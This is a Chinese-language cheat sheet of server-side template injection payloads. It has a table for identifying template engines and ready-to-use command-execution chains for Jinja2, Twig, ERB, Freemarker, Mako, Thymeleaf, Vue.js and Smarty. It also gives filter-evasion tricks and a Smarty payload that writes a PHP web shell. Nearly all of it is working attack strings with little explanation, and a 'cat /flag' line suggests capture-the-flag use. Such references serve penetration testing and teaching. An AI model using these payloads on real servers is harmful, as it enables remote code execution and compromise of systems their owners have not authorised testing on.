# SSTI 注入链速查表

## 模板引擎识别

| 测试 payload | 如果渲染结果为 | 引擎 |
|-------------|--------------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig / Twig |
| `{{7*7}}` | `{{7*7}}` | 不是 Jinja2/Twig |
| `${7*7}` | `49` | Freemarker / Velocity / Mako |
| `#{7*7}` | `49` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `${7*7}` | `${49}` | Freemarker |
| `#{7*7}` | `#{49}` | Thymeleaf |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{{config}}` | 配置对象 | Jinja2 / Twig |

## Jinja2 注入链

### 基础命令执行
```python
# 方法1：os.popen
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# 方法2：直接 import
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# 方法3：lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# 方法4：cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 方法5：joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}

# 方法6：namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### 查找子类索引
```python
# 列出所有可用子类
{{''.__class__.__mro__[1].__subclasses__()}}

# 查找特定类的索引
{% for i,c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{i}}{% endif %}{% endfor %}

# 常用子类索引
# catch_warnings: 通常在 132-140 之间
# Popen: 通常在 200+ 之间
# _io._IOBase: 通常在 80-100 之间
```

### 过滤绕过
```python
# 点号被过滤 → 用 |attr
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# 下划线被过滤 → 用 \x5f 或 request
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr(request.args.c)}}&c=__class__

# 方括号被过滤 → 用 |attr + __getitem__
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# 关键字被过滤 → 拼接
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('id').read()}}
```

## Twig 注入链

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## ERB (Ruby) 注入链

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').readlines() %>
```

## Freemarker 注入链

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Mako 注入链

```python
${__import__('os').popen('id').read()}
<% import os %>${os.popen('id').read()}
```

## Thymeleaf 注入链

```
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[[${new java.lang.ProcessBuilder({'id'}).start()}]]
```

## Vue.js 模板注入

```javascript
{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
```

## Smarty 注入链

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
```
